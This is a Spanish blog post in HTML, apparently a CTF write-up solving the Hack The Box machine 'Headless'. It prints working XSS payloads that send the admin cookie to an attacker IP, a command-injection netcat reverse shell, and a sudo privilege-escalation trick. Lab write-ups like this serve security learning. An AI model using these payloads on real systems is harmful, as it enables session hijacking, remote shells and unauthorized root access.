@@ -1,0 +1,461 @@
+<!DOCTYPE html>
+<html lang="es">
+    <head>
+        <meta charset="utf-8">
+        <meta http-equiv="X-UA-Compatible" content="IE=edge">
+        <meta name="viewport" content="width=device-width, initial-scale=1.0">
+        <link rel="stylesheet" type="text/css" href="https://alimh0x.github.io/theme/css/elegant.prod.9e9d5ce754.css" media="screen">
+        <link rel="stylesheet" type="text/css" href="https://alimh0x.github.io/theme/css/custom.css" media="screen">
+
+
+        <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.0.0-beta3/css/all.min.css">
+
+
+        <link rel="dns-prefetch" href="//fonts.googleapis.com">
+        <link rel="preconnect" href="https://fonts.gstatic.com/" crossorigin>
+
+        <meta name="author" content="Alexis Imhoff" />
+
+        <meta property="og:type" content="article" />
+        <meta name="twitter:card" content="summary">
+
+<meta name="keywords" content="Linux, CTF, Cross-Site Scripting (XSS), Command injection, Abusing Sudoers Privilege, HTB, " />
+
+<meta property="og:title" content="Resolución de máquina Headless "/>
+<meta property="og:url" content="https://alimh0x.github.io/htb-headless.html" />
+<meta property="og:description" content="Enumeración Escaneo de puertos: nmap -p- --open --min-rate 5000 -vvv -sS -n -Pn 10.10.11.8 Host is up, received user-set (0.28s latency). Scanned at 2024-07-02 14:28:11 -03 for 18s Not shown: 65533 closed tcp ports (reset) PORT STATE SERVICE REASON 22/tcp open ssh syn-ack …" />
+<meta property="og:site_name" content="alimh blog" />
+<meta property="og:article:author" content="Alexis Imhoff" />
+<meta property="og:article:published_time" content="2024-11-22T00:00:00-03:00" />
+<meta name="twitter:title" content="Resolución de máquina Headless ">
+<meta name="twitter:description" content="Enumeración Escaneo de puertos: nmap -p- --open --min-rate 5000 -vvv -sS -n -Pn 10.10.11.8 Host is up, received user-set (0.28s latency). Scanned at 2024-07-02 14:28:11 -03 for 18s Not shown: 65533 closed tcp ports (reset) PORT STATE SERVICE REASON 22/tcp open ssh syn-ack …">
+
+        <title>Resolución de máquina Headless  · alimh blog
+</title>
+
+
+
+    </head>
+    <body>
+        <div id="content">
+            <div class="navbar navbar-static-top">
+                <div class="navbar-inner">
+                    <div class="container-fluid">
+                        <a class="btn btn-navbar" data-toggle="collapse" data-target=".nav-collapse">
+                            <span class="icon-bar"></span>
+                            <span class="icon-bar"></span>
+                            <span class="icon-bar"></span>
+                        </a>
+                        <a class="brand" href="https://alimh0x.github.io/"><span class=site-name>alimh blog</span></a>
+                        <div class="nav-collapse collapse">
+                            <ul class="nav pull-right top-menu">
+                                <li >
+                                    <a href=
+                                       https://alimh0x.github.io
+                                    >Home</a>
+                                </li>
+                                <li ><a href="https://alimh0x.github.io/categories.html">Categories</a></li>
+                                <li ><a href="https://alimh0x.github.io/tags.html">Tags</a></li>
+                                <li ><a href="https://alimh0x.github.io/archives.html">Archives</a></li>
+                                <li><form class="navbar-search" action="https://alimh0x.github.io/search.html" onsubmit="return validateForm(this.elements['q'].value);"> <input type="text" class="search-query" placeholder="Search" name="q" id="tipue_search_input"></form></li>
+                            </ul>
+                        </div>
+                    </div>
+                </div>
+            </div>
+            <div class="container-fluid">
+              <div class="row-fluid">
+                <div class="span2"> 
+<aside id="sidebar">
+    <div class="about-me">
+        <img src="https://alimh0x.github.io/images/avatar.webp" alt="Mi Foto" class="avatar">
+        <p>Hola! Soy Alexis Imhoff. Ingeniero en informática apasionado por la ciberseguridad. En este blog subiré writeups de CTFs y algun que otro tema relacionado a seguridad.</p>
+        <ul class="social-links">
+            <li>
+                <a href="https://www.linkedin.com/in/alexis-imhoff/" target="_blank" rel="noopener noreferrer">
+                    <i class="fab fa-linkedin"></i>
+                    <!-- Linkedin -->
+              </a>
+            </li>
+        </ul>
+    </div>
+</aside>
+                </div>
+              <div class="span10">
+<article itemscope>
+<div class="row-fluid">
+    <header class="page-header span10 offset1">
+        <h1>
+            <a href="https://alimh0x.github.io/htb-headless.html">
+                Resolución de máquina Headless
+            </a>
+        </h1>
+    </header>
+</div>
+
+<div class="row-fluid">
+        <div class="span8 offset1 article-content">
+            
+            <p><img alt="machine" src="images/images_htb_headless/headless_logo.jpg"></p>
+<h1>Enumeración</h1>
+<p>Escaneo de puertos:</p>
+<div class="highlight"><pre><span></span><code>nmap -p- --open --min-rate 5000 -vvv -sS -n -Pn 10.10.11.8
+</code></pre></div>
+
+<div class="highlight"><pre><span></span><code>Host is up, received user-set (0.28s latency).
+Scanned at 2024-07-02 14:28:11 -03 for 18s
+Not shown: 65533 closed tcp ports (reset)
+PORT     STATE SERVICE REASON
+22/tcp   open  ssh     syn-ack ttl 63
+5000/tcp open  upnp    syn-ack ttl 63
+</code></pre></div>
+
+<p>Detectamos versión y servicio de los puertos abiertos:</p>
+<div class="highlight"><pre><span></span><code>nmap -sCV -p22,5000 10.10.11.8
+</code></pre></div>
+
+<div class="highlight"><pre><span></span><code>PORT     STATE SERVICE VERSION
+22/tcp open  ssh     OpenSSH 9.2p1 Debian 2+deb12u2 (protocol 2.0)
+| ssh-hostkey: 
+|   256 90:02:94:28:3d:ab:22:74:df:0e:a3:b2:0f:2b:c6:17 (ECDSA)
+|_  256 2e:b9:08:24:02:1b:60:94:60:b3:84:a9:9e:1a:60:ca (ED25519)
+Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
+5000/tcp open  upnp?
+| fingerprint-strings: 
+|   GetRequest: 
+|     HTTP/1.1 200 OK
+|     Server: Werkzeug/2.2.2 Python/3.11.2
+|     Date: Tue, 02 Jul 2024 17:25:04 GMT
+|     Content-Type: text/html; charset=utf-8
+|     Content-Length: 2799
+|     Set-Cookie: is_admin=InVzZXIi.uAlmXlTvm8vyihjNaPDWnvB_Zfs; Path=/
+|     Connection: close
+|     <span class="cp">&lt;!DOCTYPE html&gt;</span>
+|     <span class="p">&lt;</span><span class="nt">html</span> <span class="na">lang</span><span class="o">=</span><span class="s">&quot;en&quot;</span><span class="p">&gt;</span>
+|     <span class="p">&lt;</span><span class="nt">head</span><span class="p">&gt;</span>
+|     <span class="p">&lt;</span><span class="nt">meta</span> <span class="na">charset</span><span class="o">=</span><span class="s">&quot;UTF-8&quot;</span><span class="p">&gt;</span>
+|     <span class="p">&lt;</span><span class="nt">meta</span> <span class="na">name</span><span class="o">=</span><span class="s">&quot;viewport&quot;</span> <span class="na">content</span><span class="o">=</span><span class="s">&quot;width=device-width, initial-scale=1.0&quot;</span><span class="p">&gt;</span>
+|     <span class="p">&lt;</span><span class="nt">title</span><span class="p">&gt;</span>Under Construction<span class="p">&lt;/</span><span class="nt">title</span><span class="p">&gt;</span>
+|     <span class="p">&lt;</span><span class="nt">style</span><span class="p">&gt;</span><span class="w"></span>
+<span class="o">|</span><span class="w">     </span><span class="nt">body</span><span class="w"> </span><span class="p">{</span><span class="w"></span>
+|     font-family: &#39;Arial&#39;, sans-serif;
+|     background-color: #f7f7f7;
+|     margin: 0;
+|     padding: 0;
+|     display: flex;
+|     justify-content: center;
+|     align-items: center;
+|     height: 100vh;
+|     .container {
+|     text-align: center;
+|     background-color: #fff;
+|     border-radius: 10px;
+|     box-shadow: 0px 0px 20px rgba(0, 0, 0, 0.2);
+|   RTSPRequest: 
+|     <span class="cp">&lt;!DOCTYPE HTML&gt;</span>
+|     <span class="p">&lt;</span><span class="nt">html</span> <span class="na">lang</span><span class="o">=</span><span class="s">&quot;en&quot;</span><span class="p">&gt;</span>
+|     <span class="p">&lt;</span><span class="nt">head</span><span class="p">&gt;</span>
+|     <span class="p">&lt;</span><span class="nt">meta</span> <span class="na">charset</span><span class="o">=</span><span class="s">&quot;utf-8&quot;</span><span class="p">&gt;</span>
+|     <span class="p">&lt;</span><span class="nt">title</span><span class="p">&gt;</span>Error response<span class="p">&lt;/</span><span class="nt">title</span><span class="p">&gt;</span>
+|     <span class="p">&lt;/</span><span class="nt">head</span><span class="p">&gt;</span>
+|     <span class="p">&lt;</span><span class="nt">body</span><span class="p">&gt;</span>
+|     <span class="p">&lt;</span><span class="nt">h1</span><span class="p">&gt;</span>Error response<span class="p">&lt;/</span><span class="nt">h1</span><span class="p">&gt;</span>
+|     <span class="p">&lt;</span><span class="nt">p</span><span class="p">&gt;</span>Error code: 400<span class="p">&lt;/</span><span class="nt">p</span><span class="p">&gt;</span>
+|     <span class="p">&lt;</span><span class="nt">p</span><span class="p">&gt;</span>Message: Bad request version (&#39;RTSP/1.0&#39;).<span class="p">&lt;/</span><span class="nt">p</span><span class="p">&gt;</span>
+|     <span class="p">&lt;</span><span class="nt">p</span><span class="p">&gt;</span>Error code explanation: 400 - Bad request syntax or unsupported method.<span class="p">&lt;/</span><span class="nt">p</span><span class="p">&gt;</span>
+|     <span class="p">&lt;/</span><span class="nt">body</span><span class="p">&gt;</span>
+|_    <span class="p">&lt;/</span><span class="nt">html</span><span class="p">&gt;</span>
+</code></pre></div>
+
+<p>Si accedemos al sitio, vemos lo siguiente:</p>
+<p><img alt="headless" src="images/images_htb_headless/htb_headless-1.jpg"></p>
+<p>Inspeccionamos las tecnologías que está usando la web:</p>
+<p><img alt="headless" src="images/images_htb_headless/htb_headless-2.jpg"></p>
+<p>Realizamos fuzzing para intentar encontrar directorios ocultos:</p>
+<div class="highlight"><pre><span></span><code>gobuster dir -u http://10.10.11.8:5000 -w /usr/share/SecLists/Discovery/Web-Content/directory-list-2.3-medium.txt -t <span class="m">50</span>
+</code></pre></div>
+
+<p><img alt="headless" src="images/images_htb_headless/htb_headless-3.jpg"></p>
+<p>Si intentamos acceder a <em>/dashboard</em>, no tenemos permisos:</p>
+<p><img alt="headless" src="images/images_htb_headless/htb_headless-4.jpg"></p>
+<p>Si accedemos al apartado de <em>/support</em>, vemos el siguiente formulario:</p>
+<p><img alt="headless" src="images/images_htb_headless/htb_headless-5.jpg"></p>
+<p>Probamos cargar datos y pasa sin problemas. Ahora, intentamos en el campo <strong>Message</strong> poner lo siguiente para testear si es vulnerable a XSS:</p>
+<div class="highlight"><pre><span></span><code><span class="o">&lt;</span><span class="nx">script</span><span class="o">&gt;</span><span class="nx">alert</span><span class="p">(</span><span class="s2">&quot;XSS&quot;</span><span class="p">)</span><span class="o">&lt;</span><span class="err">/script&gt;</span><span class="w"></span>
+</code></pre></div>
+
+<p>Vemos que nos bloquea con el siguiente mensaje:</p>
+<p><img alt="headless" src="images/images_htb_headless/htb_headless-6.jpg"></p>
+<p>Por lo visto, se envía una alerta al Administrador para que la revise. Eso quiere decir que el Administrador está logueado, por lo que podemos intentar obtener su cookie de sesión. Esto será posible ya que <strong>Httpnly</strong> está en <strong>False</strong>:</p>
+<p><img alt="headless" src="images/images_htb_headless/htb_headless-7.jpg"></p>
+<p>Si intentamos decodificar el valor de la cookie, vemos que la primer parte se refiere a "user". Al resto lo toma como inválido:</p>
+<p><img alt="headless" src="images/images_htb_headless/htb_headless-8.jpg"></p>
+<h1>Intrusión</h1>
+<h2>Obteniendo la cookie de sesión del usuario Administrador</h2>
+<h3>Opción 1</h3>
+<p>Capturamos la request al panel de <em>Support</em> con Burpsuite. Para obtener la sesión del usuario administrador, debiéramos insertar el código en un lugar donde no se dispare el bloqueo. Indagando un poco en internet, notamos que podemos hacer uso del header <strong>User-Agent</strong> (quizás el decode de la cookie anterior era una pista).</p>
+<p>Primero, vamos a levantar un servidor web con Python:</p>
+<div class="highlight"><pre><span></span><code>python3 -m http.simple <span class="m">80</span>
+</code></pre></div>
+
+<p>Luego, vamos a generar una nueva alerta para que la solicitud sea enviada al Administrador, pero en el <strong>User-Agent</strong>, vamos a especificar lo siguiente: </p>
+<div class="highlight"><pre><span></span><code><span class="nt">User-Agent</span><span class="o">:</span><span class="w"> </span><span class="o">&lt;</span><span class="nt">img</span><span class="w"> </span><span class="nt">src</span><span class="o">=</span><span class="nt">x</span><span class="w"> </span><span class="nt">onerror</span><span class="o">=</span><span class="nt">fetch</span><span class="o">(</span><span class="s1">&#39;http://10.10.16.4/&#39;</span><span class="o">+</span><span class="nt">document</span><span class="p">.</span><span class="nc">cookie</span><span class="o">);&gt;</span><span class="w"></span>
+</code></pre></div>
+
+<p><img alt="headless" src="images/images_htb_headless/htb_headless-9.jpg"></p>
+<p>Esperamos un poco, cuando el administrador ingrese a validar la alerta, recibiremos su cookie de sesión:</p>
+<p><img alt="headless" src="images/images_htb_headless/htb_headless-10.jpg"></p>
+<div class="highlight"><pre><span></span><code>/is_admin=ImFkbWluIg.dmzDkZNEm6CK0oyL1fbM-SnXpH0
+</code></pre></div>
+
+<p><img alt="headless" src="images/images_htb_headless/htb_headless-11.jpg"></p>
+<h3>Opción 2</h3>
+<p>Otra opción es crear un archivo, por ejemplo <strong>test.js</strong> con el siguiente contenido: </p>
+<div class="highlight"><pre><span></span><code><span class="kd">var</span><span class="w"> </span><span class="nx">request</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="ow">new</span><span class="w"> </span><span class="nx">XMLHttpRequest</span><span class="p">();</span><span class="w"></span>
+<span class="nx">request</span><span class="p">.</span><span class="nx">open</span><span class="p">(</span><span class="s1">&#39;GET&#39;</span><span class="p">,</span><span class="w"> </span><span class="s1">&#39;http://10.10.16.4/cookie=&#39;</span><span class="w"> </span><span class="o">+</span><span class="w"> </span><span class="nb">document</span><span class="p">.</span><span class="nx">cookie</span><span class="p">);</span><span class="w"></span>
+<span class="nx">request</span><span class="p">.</span><span class="nx">send</span><span class="p">();</span><span class="w"></span>
+</code></pre></div>
+
+<p>Y en <strong>User-Agent</strong> especificarlo de esta forma:</p>
+<div class="highlight"><pre><span></span><code>User-Agent: <span class="nt">&lt;script</span> <span class="na">src=</span><span class="s">&quot;http://10.10.16.4/test.js&quot;</span><span class="nt">&gt;&lt;/script&gt;</span>
+</code></pre></div>
+
+<p>El resultado es el mismo: </p>
+<p><img alt="headless" src="images/images_htb_headless/htb_headless-12.jpg"></p>
+<h2>Impersonalizando al usuario admin</h2>
+<p>Si ahora modificamos el valor obtenido en el campo <strong>Value</strong> para impersonalizar al usuario <strong>admin</strong> y recargamos el Dashboard, lo veremos: </p>
+<p><img alt="headless" src="images/images_htb_headless/htb_headless-13.jpg"></p>
+<h2>Ejecución remota de código</h2>
+<p>Si hacemos click en <strong>Generate Report</strong>, vemos como resultado un <em>Systems are up and running!</em>. Vamos a capturar nuevamente la request con Burpsuite.</p>
+<p>Al lado del campo <strong>date</strong> que se tramita por POST en la request, vamos a probar poner <em>punto y coma</em>, y seguido un comando como por ejemplo, <strong>whoami</strong>:</p>
+<p><img alt="headless" src="images/images_htb_headless/htb_headless-14.jpg"></p>
+<p>Vemos que nos representa el usuario <strong>dvir</strong>. </p>
+<h2>Obteniendo una Reverse Shell</h2>
+<p>Nos quedamos a la escucha con netcat en el puerto 443 y ejecutamos lo siguiente: </p>
+<div class="highlight"><pre><span></span><code><span class="nv">date</span><span class="o">=</span><span class="m">2023</span>-09-15<span class="p">;</span>nc -e /bin/bash <span class="m">10</span>.10.16.4 <span class="m">443</span>
+</code></pre></div>
+
+<p><img alt="headless" src="images/images_htb_headless/htb_headless-15.jpg"></p>
+<p>Obtenemos la Shell:</p>
+<p><img alt="headless" src="images/images_htb_headless/htb_headless-16.jpg"></p>
+<p>Hacemos un tratamiento de la TTY, y luego vemos la primer flag:</p>
+<p><img alt="headless" src="images/images_htb_headless/htb_headless-17.jpg"></p>
+<h1>Escalación de privilegios</h1>
+<p>Si ejecutamos <em>sudo -l</em>, vemos que cualquier usuario puede ejecutar <strong>usr/bin/syscheck</strong> como root sin especificar contraseña:</p>
+<p><img alt="headless" src="images/images_htb_headless/htb_headless-18.jpg"></p>
+<p>El script es el siguiente. Primero valida si somos root (<em>EUID</em> es el User ID, y es 0 si hace referencia a <em>root</em>). Luego, hace una serie de validaciones a nivel sistema como el tiempo de modificación del kernel, el espacio en disco, el promedio de carga del sistema y el estado de un servicio de base de datos (initdb.sh):</p>
+<div class="highlight"><pre><span></span><code><span class="ch">#!/bin/bash</span>
+
+<span class="k">if</span> <span class="o">[</span> <span class="s2">&quot;</span><span class="nv">$EUID</span><span class="s2">&quot;</span> -ne <span class="m">0</span> <span class="o">]</span><span class="p">;</span> <span class="k">then</span>
+  <span class="nb">exit</span> <span class="m">1</span>
+<span class="k">fi</span>
+
+<span class="nv">last_modified_time</span><span class="o">=</span><span class="k">$(</span>/usr/bin/find /boot -name <span class="s1">&#39;vmlinuz*&#39;</span> -exec stat -c %Y <span class="o">{}</span> + <span class="p">|</span> /usr/bin/sort -n <span class="p">|</span> /usr/bin/tail -n <span class="m">1</span><span class="k">)</span>
+<span class="nv">formatted_time</span><span class="o">=</span><span class="k">$(</span>/usr/bin/date -d <span class="s2">&quot;@</span><span class="nv">$last_modified_time</span><span class="s2">&quot;</span> +<span class="s2">&quot;%d/%m/%Y %H:%M&quot;</span><span class="k">)</span>
+/usr/bin/echo <span class="s2">&quot;Last Kernel Modification Time: </span><span class="nv">$formatted_time</span><span class="s2">&quot;</span>
+
+<span class="nv">disk_space</span><span class="o">=</span><span class="k">$(</span>/usr/bin/df -h / <span class="p">|</span> /usr/bin/awk <span class="s1">&#39;NR==2 {print $4}&#39;</span><span class="k">)</span>
+/usr/bin/echo <span class="s2">&quot;Available disk space: </span><span class="nv">$disk_space</span><span class="s2">&quot;</span>
+
+<span class="nv">load_average</span><span class="o">=</span><span class="k">$(</span>/usr/bin/uptime <span class="p">|</span> /usr/bin/awk -F<span class="s1">&#39;load average:&#39;</span> <span class="s1">&#39;{print $2}&#39;</span><span class="k">)</span>
+/usr/bin/echo <span class="s2">&quot;System load average: </span><span class="nv">$load_average</span><span class="s2">&quot;</span>
+
+<span class="k">if</span> ! /usr/bin/pgrep -x <span class="s2">&quot;initdb.sh&quot;</span> <span class="p">&amp;</span>&gt;/dev/null<span class="p">;</span> <span class="k">then</span>
+  /usr/bin/echo <span class="s2">&quot;Database service is not running. Starting it...&quot;</span>
+  ./initdb.sh <span class="m">2</span>&gt;/dev/null
+<span class="k">else</span>
+  /usr/bin/echo <span class="s2">&quot;Database service is running.&quot;</span>
+<span class="k">fi</span>
+
+<span class="nb">exit</span> <span class="m">0</span>
+</code></pre></div>
+
+<p>Vamos a ejecutarlo:</p>
+<p><img alt="headless" src="images/images_htb_headless/htb_headless-19.jpg"></p>
+<p>Vemos en el script que para validar si el servicio de la base de datos está corriendo, consulta el script <strong>initdb.sh</strong>, pero si lo buscamos, no existe: </p>
+<p><img alt="headless" src="images/images_htb_headless/htb_headless-20.jpg"></p>
+<p>Por lo tanto, vamos a crearlo dentro de nuestro home. Especificaremos que se ejecute una /bin/bash. Como esto será ejecutado por root, obtendremos la shell al correr el script:</p>
+<div class="highlight"><pre><span></span><code><span class="nb">echo</span> <span class="s2">&quot;/bin/bash&quot;</span> &gt; initdb.sh
+chmod +x initdb.sh
+sudo /usr/bin/syscheck
+</code></pre></div>
+
+<p><img alt="headless" src="images/images_htb_headless/htb_headless-21.jpg"></p>
+<p>Otra opción hubiese sido darle permisos SUID a <em>/bin/bash</em> y luego ejecutarla:</p>
+<div class="highlight"><pre><span></span><code><span class="nb">echo</span> <span class="s2">&quot;chmod u+s /bin/bash&quot;</span>
+sudo /usr/bin/syscheck
+/bin/bash -p
+</code></pre></div>
+
+<p><img alt="headless" src="images/images_htb_headless/htb_headless-22.jpg"></p>
+<p>Desde aquí vemos la siguiente flag:</p>
+<p><img alt="headless" src="images/images_htb_headless/htb_headless-23.jpg"></p>
+
+
+             
+ 
+            
+            
+            
+
+
+
+
+
+
+
+            <hr/>
+        </div>
+        <section id="article-sidebar" class="span2">
+            <h4>Published</h4>
+            <time itemprop="dateCreated" datetime="2024-11-22T00:00:00-03:00">vie 22 noviembre 2024</time>
+            <h4>Category</h4>
+            <a class="category-link" href="https://alimh0x.github.io/categories.html#htb-ref">HTB</a>
+            <h4>Tags</h4>
+            <ul class="list-of-tags tags-in-article">
+                <li><a href="https://alimh0x.github.io/tags.html#abusing-sudoers-privilege-ref">Abusing Sudoers Privilege
+                    <span class="superscript">9</span>
+</a></li>
+                <li><a href="https://alimh0x.github.io/tags.html#command-injection-ref">Command injection
+                    <span class="superscript">1</span>
+</a></li>
+                <li><a href="https://alimh0x.github.io/tags.html#cross-site-scripting-xss-ref">Cross-Site Scripting (XSS)
+                    <span class="superscript">1</span>
+</a></li>
+                <li><a href="https://alimh0x.github.io/tags.html#ctf-ref">CTF
+                    <span class="superscript">20</span>
+</a></li>
+                <li><a href="https://alimh0x.github.io/tags.html#linux-ref">Linux
+                    <span class="superscript">14</span>
+</a></li>
+            </ul>
+            
+
+
+
+
+
+            
+
+
+
+
+
+        </section>
+</div>
+</article>
+<!-- Root element of PhotoSwipe. Must have class pswp. -->
+<div class="pswp" tabindex="-1" role="dialog" aria-hidden="true">
+
+    <!-- Background of PhotoSwipe.
+         It's a separate element as animating opacity is faster than rgba(). -->
+    <div class="pswp__bg"></div>
+
+    <!-- Slides wrapper with overflow:hidden. -->
+    <div class="pswp__scroll-wrap">
+
+        <!-- Container that holds slides.
+            PhotoSwipe keeps only 3 of them in the DOM to save memory.
+            Don't modify these 3 pswp__item elements, data is added later on. -->
+        <div class="pswp__container">
+            <div class="pswp__item"></div>
+            <div class="pswp__item"></div>
+            <div class="pswp__item"></div>
+        </div>
+
+        <!-- Default (PhotoSwipeUI_Default) interface on top of sliding area. Can be changed. -->
+        <div class="pswp__ui pswp__ui--hidden">
+
+            <div class="pswp__top-bar">
+
+                <!--  Controls are self-explanatory. Order can be changed. -->
+
+                <div class="pswp__counter"></div>
+
+                <button class="pswp__button pswp__button--close" title="Close (Esc)"></button>
+
+                <button class="pswp__button pswp__button--share" title="Share"></button>
+
+                <button class="pswp__button pswp__button--fs" title="Toggle fullscreen"></button>
+
+                <button class="pswp__button pswp__button--zoom" title="Zoom in/out"></button>
+
+                <!-- Preloader demo https://codepen.io/dimsemenov/pen/yyBWoR -->
+                <!-- element will get class pswp__preloader--active when preloader is running -->
+                <div class="pswp__preloader">
+                    <div class="pswp__preloader__icn">
+                      <div class="pswp__preloader__cut">
+                        <div class="pswp__preloader__donut"></div>
+                      </div>
+                    </div>
+                </div>
+            </div>
+
+            <div class="pswp__share-modal pswp__share-modal--hidden pswp__single-tap">
+                <div class="pswp__share-tooltip"></div>
+            </div>
+
+            <button class="pswp__button pswp__button--arrow--left" title="Previous (arrow left)">
+            </button>
+
+            <button class="pswp__button pswp__button--arrow--right" title="Next (arrow right)">
+            </button>
+
+            <div class="pswp__caption">
+                <div class="pswp__caption__center"></div>
+            </div>
+
+        </div>
+
+    </div>
+
+</div>              </div>
+            </div>
+        </div>
+<footer>
+
+
+
+
+    <div id="fpowered">
+        Powered by: <a href="http://getpelican.com/" title="Pelican Home Page" target="_blank" rel="nofollow noopener noreferrer">Pelican</a>
+        Theme: <a href="https://elegant.oncrashreboot.com/" title="Theme Elegant Home Page" target="_blank" rel="nofollow noopener noreferrer">Elegant</a>
+    </div>
+</footer>            <script src="//code.jquery.com/jquery.min.js"></script>
+        <script src="//netdna.bootstrapcdn.com/twitter-bootstrap/2.3.2/js/bootstrap.min.js"></script>
+        <script src="https://alimh0x.github.io/theme/js/elegant.prod.9e9d5ce754.js"></script>
+        <script>
+            function validateForm(query)
+            {
+                return (query.length > 0);
+            }
+        </script>
+
+    <script>
+    (function () {
+        if (window.location.hash.match(/^#comment-\d+$/)) {
+            $('#comment_thread').collapse('show');
+        }
+    })();
+    window.onhashchange=function(){
+        if (window.location.hash.match(/^#comment-\d+$/))
+            window.location.reload(true);
+    }
+    $('#comment_thread').on('shown', function () {
+        var link = document.getElementById('comment-accordion-toggle');
+        var old_innerHTML = link.innerHTML;
+        $(link).fadeOut(200, function() {
+            $(this).text('Click here to hide comments').fadeIn(200);
+        });
+        $('#comment_thread').on('hidden', function () {
+            $(link).fadeOut(200, function() {
+                $(this).text(old_innerHTML).fadeIn(200);
+            });
+        })
+    })
+</script>
+
+    </body>
+    <!-- Theme: Elegant built for Pelican
+        License : MIT -->
+</html>
